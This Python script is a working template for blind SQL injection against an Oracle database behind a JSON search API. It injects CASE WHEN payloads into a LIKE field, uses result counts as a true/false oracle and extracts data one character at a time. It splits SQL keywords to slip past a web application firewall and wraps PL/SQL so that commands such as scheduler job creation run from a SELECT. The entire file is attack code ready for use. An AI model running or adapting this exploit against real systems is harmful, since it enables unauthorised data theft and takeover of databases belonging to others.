#!/usr/bin/env python3
# Oracle blind SQLi via LIKE-concat + CASE WHEN oracle — generic template.
# Fill URL, HEADERS, KNOWN (a value that matches 1 row), JUNK (matches 0 rows).
# Usage: python oracle_like_blind.py "COND"   -> prints TRUE/FALSE
#        import oracle() from this file for extraction loops.
import requests, sys, urllib3
urllib3.disable_warnings()

URL = "http://target/api/search"
HEADERS = {"Content-Type": "application/json", "Authorization": "Bearer <token>"}
KNOWN = "152654"          # TRUE marker: some row matches this
JUNK = "zzzz"             # FALSE marker
BODY_TMPL = '{"searchObject":{"quickName":"%s","orgId":1},"page":{"index":1,"size":10}}'
SLOW_TRUE_MS = 4000       # responses slower than this with rec=1 are fallback-path, distrust
TOK_FILE = CK_FILE = None  # optional: paths to files holding Bearer JWT / Cookie header.
                          # Prefer files over embedding long tokens in script bodies —
                          # tooling can silently abbreviate huge pasted strings -> 401.

def _auth():
    if TOK_FILE and CK_FILE:
        h = dict(HEADERS)
        h["Authorization"] = "Bearer " + open(TOK_FILE).read().strip()
        h["Cookie"] = open(CK_FILE).read().strip()
        return h
    return HEADERS

def oracle(cond, timeout=30):
    """Return True/False, or an error string. Payload self-balances the LIKE quote."""
    payload = "' || (CASE WHEN " + cond + " THEN '" + KNOWN + "' ELSE '" + JUNK + "' END) || '"
    r = requests.post(URL, headers=_auth(), data=BODY_TMPL % payload,
                      timeout=timeout, verify=False)
    ms = r.elapsed.total_seconds() * 1000
    try:
        j = r.json()
    except Exception:
        return "WAF/HTML: " + r.text[:60]
    if j.get("status") not in ("SUCCESS", None):
        return "ERR: " + str(j.get("message"))[:80]
    data = j.get("data") or {}
    n = data.get("totalRecord")
    if n == 1 and ms < SLOW_TRUE_MS:
        return True
    if n in (0, None):
        return False
    return "AMBIGUOUS rec=%s" % n

def like_prefix_scan(expr, charset="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ._-$:/", maxlen=80):
    """Extract a string via prefix LIKE (no SUBSTR needed)."""
    out = ""
    for _ in range(maxlen):
        found = None
        for c in charset:
            if oracle(expr + " LIKE '" + out + c + "%'") is True:
                found = c
                break
        if found is None:
            break
        out += found
    return out

def xmlgen_sql(inner_sql):
    """Wrap arbitrary SQL in the DBMS_XMLGEN channel (SELECT split to dodge WAF).
    Inner SQL runs with full schema rights; strings inside it use doubled ''.
    CAUTION: pair with row_exists(), NOT COUNT(*) (always 1 row -> false TRUE)."""
    return ("LENGTH(DBMS_XMLGEN.GETXML('SEL'||'ECT " + inner_sql + "'))>0")

def row_exists(table_and_where):
    """Row-existence condition: TRUE only when >=1 row matches. 0 rows -> GETXML NULL."""
    return xmlgen_sql("1 c FROM " + table_and_where)

def with_function_ei(plsql_body, fn_name="f"):
    """WITH FUNCTION + EXECUTE IMMEDIATE wrapper for running procedures from a SELECT.
    plsql_body: PL/SQL to EXECUTE IMMEDIATE, with quotes ESCAPED FOR LAYER 2 ('''' per
    quote in the final PL/SQL). Adds EXCEPTION WHEN OTHERS to leak ORA- text via the
    boolean channel: filter the returned f with LIKE 'err:ORA-xxx%' patterns.
    Example inner for CREATE_JOB (see references/oracle-like-blind-sqli-waf.md #7-8):
      WITH FUNCTION f RETURN VARCHAR2 IS BEGIN EXECUTE IMMEDIATE
        ''BEGIN DB''||''MS_SCHE''||''DULER.CREATE_JOB(job_name=>''''J1'''', ...); END;'';
      RETURN ''ok''; EXCEPTION WHEN OTHERS THEN RETURN ''err:''||SQLERRM; END;
      SELECT f r FROM all_tables WHERE ROWNUM=1 AND f=''ok''"""
    return xmlgen_sql(plsql_body)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("usage: oracle_like_blind.py \"<SQL condition>\"")
        sys.exit(1)
    print(oracle(sys.argv[1]))
